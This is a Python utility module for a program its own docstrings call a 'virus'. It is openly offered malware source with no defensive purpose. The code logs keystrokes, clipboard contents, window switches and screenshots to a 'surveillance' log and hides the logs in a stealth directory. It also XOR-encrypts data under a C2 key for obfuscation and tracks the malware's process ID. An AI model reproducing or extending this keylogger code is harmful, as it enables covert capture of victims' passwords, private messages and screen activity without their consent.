"""
Virus Utility Functions
"""
import os
import datetime
import base64
import hashlib
import json
from virus_config import *

def log_activity(activity_type, details):
    """Log comprehensive user activity to keyboard_log.txt (merged log) - FILTERED"""
    # Only log useful activity types: WINDOW, SCREENSHOT, key presses (EVDEV/PYNPUT), SYSTEM (important only), CLIPBOARD
    useful_types = {
        'WINDOW', 'SCREENSHOT', 'EVDEV', 'PYNPUT', 'CLIPBOARD',
        'SYSTEM', 'APPLICATION'  # SYSTEM and APPLICATION for important events only
    }
    
    # Filter SYSTEM logs - only keep important ones
    if activity_type == 'SYSTEM':
        important_keywords = [
            'CPU:', 'Memory:', 'Disk:', 'Network connections:',
            'Screenshot saved:', 'Keylogger started', 'Keylogger monitoring',
            'Surveillance Session', 'COMPREHENSIVE SURVEILLANCE'
        ]
        if not any(keyword in details for keyword in important_keywords):
            return  # Skip non-important SYSTEM logs
    
    # Filter APPLICATION logs - only keep window switches
    if activity_type == 'APPLICATION':
        if 'Switched to:' not in details:
            return  # Skip non-window-switch APPLICATION logs
    
    # Skip ERROR logs (too verbose)
    if activity_type == 'ERROR':
        return
    
    # Skip MOUSE logs (too verbose)
    if activity_type == 'MOUSE':
        return
    
    # Skip other non-useful types
    if activity_type not in useful_types:
        return
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    log_entry = f"[{timestamp}] [{activity_type}] {details}\n"
    
    try:
        # Write to keyboard_log.txt (merged log file)
        log_path = f"{DATA_DIR}/{LOG_FILE}" if ENABLE_STEALTH and os.path.exists(DATA_DIR) else LOG_FILE
        with open(log_path, "a", encoding="utf-8") as log_file:
            log_file.write(log_entry)
            log_file.flush()
    except Exception as e:
        pass

def init_log_file():
    """Initialize log file with session start marker (keyboard_log.txt - merged log)"""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    session_start = f"\n{'='*60}\n"
    session_start += f"Surveillance Session Started: {timestamp}\n"
    session_start += f"{'='*60}\n"
    session_start += "COMPREHENSIVE SURVEILLANCE ACTIVATED\n"
    session_start += "Monitoring: Keyboard | Mouse | Clipboard | Windows | Screenshots | System\n"
    session_start += f"{'='*60}\n"
    
    try:
        log_path = f"{DATA_DIR}/{LOG_FILE}" if ENABLE_STEALTH and os.path.exists(DATA_DIR) else LOG_FILE
        with open(log_path, "a", encoding="utf-8") as log_file:
            log_file.write(session_start)
            log_file.flush()
    except Exception as e:
        pass

def close_log_file():
    """Write session end marker to log file (keyboard_log.txt - merged log)"""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    session_end = f"\n{'='*60}\n"
    session_end += f"Surveillance Session Ended: {timestamp}\n"
    session_end += f"{'='*60}\n\n"
    
    try:
        log_path = f"{DATA_DIR}/{LOG_FILE}" if ENABLE_STEALTH and os.path.exists(DATA_DIR) else LOG_FILE
        with open(log_path, "a", encoding="utf-8") as log_file:
            log_file.write(session_end)
            log_file.flush()
    except Exception as e:
        pass

def encrypt_data(data, key=None):
    """Simple XOR encryption for data obfuscation"""
    if key is None:
        key = C2_KEY
    key_hash = hashlib.sha256(key.encode()).digest()
    encrypted = bytearray()
    for i, byte in enumerate(data.encode() if isinstance(data, str) else data):
        encrypted.append(byte ^ key_hash[i % len(key_hash)])
    return base64.b64encode(bytes(encrypted)).decode()

def decrypt_data(encrypted_data, key=None):
    """Decrypt XOR encrypted data"""
    if key is None:
        key = C2_KEY
    key_hash = hashlib.sha256(key.encode()).digest()
    data = base64.b64decode(encrypted_data)
    decrypted = bytearray()
    for i, byte in enumerate(data):
        decrypted.append(byte ^ key_hash[i % len(key_hash)])
    return bytes(decrypted).decode('utf-8', errors='ignore')

def save_pid():
    """Save virus process ID"""
    try:
        os.makedirs(DATA_DIR, exist_ok=True)
        with open(VIRUS_PID_FILE, 'w') as f:
            f.write(str(os.getpid()))
    except:
        pass

def remove_pid():
    """Remove virus PID file"""
    try:
        if os.path.exists(VIRUS_PID_FILE):
            os.remove(VIRUS_PID_FILE)
    except:
        pass

def is_virus_running():
    """Check if virus is already running"""
    try:
        if os.path.exists(VIRUS_PID_FILE):
            with open(VIRUS_PID_FILE, 'r') as f:
                pid = int(f.read().strip())
            # Check if process is still alive
            try:
                os.kill(pid, 0)  # Signal 0 just checks if process exists
                return True
            except OSError:
                # Process doesn't exist, remove stale PID file
                remove_pid()
                return False
    except:
        pass
    return False

